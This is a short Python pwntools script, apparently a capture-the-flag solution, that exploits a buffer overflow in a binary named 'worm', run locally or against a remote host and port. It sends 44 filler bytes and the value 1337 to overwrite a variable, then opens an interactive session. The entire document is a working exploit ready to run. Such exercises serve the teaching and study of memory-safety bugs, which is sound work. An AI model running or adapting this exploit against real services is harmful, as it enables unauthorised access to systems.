#!/usr/bin/env python3
from pwn import args, remote, p32, process
import sys

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    serv = sys.argv[1]
    port = int(sys.argv[2])
    r = remote(serv, port) # change host and port
else:
    r = process('./worm')

PAYLOAD = b'A' * 44 + p32(1337)
r.recvuntil(b'?\n')
r.sendline(PAYLOAD + b'\x00')

r.interactive()